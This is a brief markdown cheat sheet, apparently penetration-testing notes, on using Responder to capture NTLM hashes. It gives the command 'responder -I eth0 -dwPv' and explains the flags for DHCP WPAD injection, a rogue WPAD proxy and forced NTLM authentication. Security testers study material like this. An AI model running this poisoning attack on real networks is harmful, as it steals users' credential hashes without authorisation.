# Capturing Hashes with responder

## Usage

```bash
responder -I eth0 -dwPv
```
- -I = Interface
- -d = DHCP (will inject WPAD server in DHCP response)
- -w = WPAD (starts WPAD rogue proxy server)
- -P = ProxyAuth (Force NTLM authentication)
- -v = verbose

## Output

![Responder main screen](image.png)
![Responder Capturing Hashes](image.png)